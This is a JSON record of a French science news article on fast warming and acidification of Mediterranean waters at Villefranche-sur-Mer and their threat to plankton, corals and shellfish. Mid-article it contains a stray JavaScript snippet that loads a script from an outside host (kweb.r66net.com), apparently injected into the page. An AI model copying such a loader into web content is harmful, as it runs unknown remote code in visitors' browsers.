{"title": "Le rechauffement rapide de la Mediterranee fragilise mollusques et coraux", "newspaper": "Futura Sciences", "author": ["CNRS"], "date_publi": "2017-05-30", "content": "Des changements tres rapides dans l'eau de mer de la rade de Villefranche-sur-Mer ont ete mis en evidence entre 2007 et 2015. L'augmentation de la temperature y a ete plus rapide que partout ailleurs dans l'ocean global et celle de son acidite est aussi l'une des plus elevees jamais mesurees dans le monde. Plusieurs especes sont affectees, ce qui pourrait alterer la chaine alimentaire mediterraneenne. Ce qu'il faut retenir Les emissions massives de CO 2  emises par les activites humaines sont en partie absorbees par les oceans mais au prix d'une acidification de l'eau. Dans la rade de Villefranche-sur-Mer, le suivi permanent a montre un rechauffement rapide des eaux de mer et une des acidifications les plus elevees. Plus que l'acidification, l'elevation de la temperature de l'eau menace les organismes marins, a commencer par ceux du plancton. L'ocean absorbe environ 25 % des rejets de  gaz  carbonique (CO 2 ) dus aux activites humaines, ce qui limite le  rechauffement  climatique. Ce service rendu se fait cependant au prix d'un changement de la  chimie  de l'eau de mer, notamment une augmentation de son acidite. Il existe cependant moins d'une dizaine de series temporelles a  frequence  elevee permettant de documenter le rythme de l'acidification. Celle du CNRS-INSU (une des 10 stations marines du Service d'observation en milieu littoral, labellise par le CNRS-INSU depuis 1996) fait de la rade de Villefranche-sur-Mer un site unique pour etudier acidification et rechauffement de la Mediterranee nord-occidentale. Depuis 2007, des prelevements y sont realises a frequence elevee, toutes les semaines. Les echantillons sont analyses au Service national d'analyse des parametres du CO 2  porte par l'OSU Ecce Terra. Les resultats ont montre des changements extremement rapides. En rythme decennal sur la periode 2007-2015, la temperature des eaux de surface a ainsi augmente de 0,7 degC, soit beaucoup plus vite que dans l'ocean global et cotier. Le pH a diminue de 0,0028 unite par an, soit une augmentation d'acidite de pres de 7 %, ce qui correspond a l'un des  taux d'acidification les plus eleves  releves jusqu'a present. Navire de station  Sagitta III  dans la rade de Villefranche. (c) OOV                               Le rechauffement fait deja subir de lourdes pertes  La combinaison d'un rechauffement et d'une acidification eleves n'est pas sans risque sur les services rendus par les ecosystemes mediterraneens a la societe (biodiversite, peche, aquaculture, tourisme...). Concernant les impacts de l' acidification , ils sont variables car les organismes marins ont des sensibilites differentes au pH. Plusieurs organismes planctoniques sont affectes, ce qui suggere que la chaine alimentaire mediterraneenne pourrait etre alteree dans le futur. Ces micro-organismes sont des proies indispensables pour certaines larves de poissons d'interet commercial : une diminution de leur abondance aurait donc des consequences sur la peche. Quant aux organismes qui ont un squelette (coraux) ou une coquille (huitres, moules...)  calcaire , ils sont, pour la plupart, plus sensibles que d'autres, comme les bacteries et les virus.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Le rechauffement de la mer Mediterranee aura vraisemblablement des consequences plus rapides et plus dramatiques que l' acidification . C'est notamment le cas pour les gorgones, qui ont subi des episodes de mortalite massive lors de pics de temperatures. Idem pour les  mollusques  bivalves qui representent un interet aquacole, avec une source de revenus, d'emploi et de nourriture importante. Des travaux anterieurs ont montre qu'une augmentation de 3 degC au-dessus du maximum estival de temperature conduit a une mortalite de 100 % des moules mediterraneennes. Pour en savoir plus Coraux et mollusques menaces par l'acidite de l'eau Article du CNRS publie le 27/08/2011 Le  rechauffement climatique  ne menace pas que les  especes  terrestres. Les mollusques et les coraux souffrent de l'augmentation de la temperature de la mer Mediterranee. La  resistance  des  coquilles  et squelettes est mise a rude epreuve face a l'acidification des eaux. Explications. Certains organismes calcificateurs ( moules , coquillages et  coraux ) protegent leur coquille ou leur squelette de l'action corrosive de l'eau de mer. Cela leur confere une extraordinaire capacite a resister a l' acidification croissante de l'eau de mer , liee aux rejets de gaz carbonique (CO 2 ) dans l' atmosphere . Malgre tout, cette resistance est amoindrie quand ces organismes sont exposes a une temperature elevee (superieure a 28,5 degC) durant une longue periode. C'est ce que revele une etude internationale 1  codirigee par Jean-Pierre Gattuso du Laboratoire d'oceanographie de Villefranche (CNRS/UPMC) et publiee dans la revue  Nature Climate Change . Des resultats qui laissent a penser que le rechauffement prevu de la mer Mediterranee, couple a l'acidification de ses eaux, va accroitre la frequence des episodes de mortalite de ces organismes. Les  oceans  absorbent environ le quart des rejets de gaz carbonique (CO 2 ) resultant de l'utilisation des  combustibles  fossiles et de la  deforestation . Cela represente environ 1 million de tonnes de CO 2  par heure et entraine un bouleversement de la chimie de l'eau de mer, notamment une augmentation de son acidite. Une acidite qui peut representer a terme une menace pour les organismes calcificateurs qui fabriquent un squelette ou une  coquille  calcaire, comme les coraux et les  mollusques . Coquille d'une moule ( Mytilus galloprovincialis ) maintenue a un niveau d'acidite eleve. Les parties blanchatres ne sont pas protegees par une couche organique et se dissolvent. (c) Riccardo Rodolfo-Metalpa (IAEA)                               Des episodes de mortalite massive Dans cette etude, les chercheurs ont installe des coraux, patelles (coquillages) et des moules autour de l' ile  d'Ischia (golfe de Naples, Italie) dont les eaux sont naturellement acidifiees par des sources de CO 2  liees a l' activite volcanique du Vesuve . L'utilisation d'un radiotraceur ( isotope  radioactif) leur a permis de montrer que la fabrication de calcaire par ces organismes reste possible au niveau d'acidite attendu en 2100 (pH de 7,8 en 2100, versus pH 8,1 aujourd'hui), parfois meme a un rythme accru. Les tissus et les couches organiques recouvrant les squelettes et les coquilles de ces organismes jouent un role majeur dans la protection de leurs structures de  carbonate de calcium . En revanche, les parties de coquille ou de squelette qui ne sont pas protegees par des tissus ou des  molecules  organiques elles, restent plus vulnerables et se dissolvent d'autant plus vite que l'acidite est elevee. Cependant les chercheurs montrent que cette capacite de resistance est tres amoindrie lorsque les organismes sont soumis a une longue periode de temperature inhabituellement elevee (28,5 degC). La mortalite des organismes est alors d'autant plus importante que l'acidite est elevee. Certains  invertebres  marins vivent deja actuellement a une temperature proche de leur limite de tolerance et subissent des episodes de mortalite massive. La combinaison du rechauffement de la mer Mediterranee et de l'acidification de ses eaux devrait augmenter leur frequence.  Notes Dans le cadre des projets europeens Epoca et MedSeA. Les partenaires impliques sont : le CNRS, l'universite Pierre et  Marie Curie , l'universite de Plymouth, l'Agence internationale de l' energie  atomique, le Centre scientifique de Monaco, la Station zoologique de Naples et l'universite  Bar  Ilan. A noter : le projet europeen Epoca ( European project on ocean acidification ) coordonne par Jean-Pierre Gattuso (CNRS) a ete lance en mai 2008 et pour quatre ans afin de combler les nombreuses lacunes dans la comprehension de l'acidification de l'ocean et de ses consequences. Il est coordonne par le CNRS et rassemble plus de 160 chercheurs issus de 32 instituts repartis sur 10 pays europeens. Site  web  : http://www.epoca-project.eu Lire le dernier CP dans le cadre du projet EPOCA : http://www2.cnrs.fr/presse/communique/2243.htm ", "theme": "planete"}